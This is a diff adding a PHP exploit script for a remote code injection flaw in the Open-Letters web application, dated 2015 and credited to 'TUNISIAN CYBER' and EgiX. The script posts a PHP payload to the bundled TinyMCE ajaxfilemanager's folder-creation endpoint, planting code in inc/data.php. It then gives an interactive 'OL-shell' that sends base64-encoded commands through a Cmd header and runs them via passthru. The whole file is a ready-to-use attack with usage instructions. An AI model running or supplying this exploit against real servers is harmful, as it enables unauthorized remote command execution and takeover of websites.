@@ -1,0 +1,78 @@
+<?php
+  
+/*
+OutPut:
+#[+] Author: TUNISIAN CYBER
+#[+] Script coded BY: Egidio Romano aka EgiX
+#[+] Title: Open-Letters Remote PHP Code Injection Vulnerability
+#[+] Date: 19-04-2015
+#[+] Vendor: http://www.open-letters.de/
+#[+] Type: WebAPP
+#[+] Tested on: KaliLinux (Debian)
+#[+] CVE:
+#[+] Twitter: @TCYB3R
+#[+] Egix's Contact: n0b0d13s[at]gmail[dot]com
+#[+] Proof of concept: http://i.imgur.com/TNKV8Mt.png
+OL-shell> 
+  
+*/
+  
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+  
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die( "\n[-] No response from {$host}:80\n");
+  
+    fwrite($sock, $packet);
+    return stream_get_contents($sock);
+}
+  
+print "#[+] Author: TUNISIAN CYBER\n";
+print "#[+] Script coded BY: Egidio Romano aka EgiX\n";
+print "#[+] Title: Open-Letters Remote PHP Code Injection Vulnerability\n";
+print "#[+] Date: 19-04-2015\n";
+print "#[+] Vendor: http://www.open-letters.de/\n";
+print "#[+] Type: WebAPP\n";
+print "#[+] Tested on: KaliLinux (Debian)\n";
+print "#[+] CVE:\n";
+print "#[+] Twitter: @TCYB3R\n";
+print "#[+] Egix's Contact: n0b0d13s[at]gmail[dot]com\n";
+print "#[+] Proof of concept: http://i.imgur.com/TNKV8Mt.png";
+  
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /zenphoto/\n";
+    die();
+}
+  
+$host = $argv[1];
+$path = $argv[2];
+  
+$exploit = "foo=<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
+$packet  = "POST {$path}external_scripts/tinymce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($exploit)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$exploit}";
+  
+http_send($host, $packet);
+  
+$packet  = "GET {$path}external_scripts/tinymce/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+  
+while(1)
+{
+    print "\nOL-shell> ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
+    print $m[1] : die("\n[-] Exploit failed!\n");
+}
+  
+?>
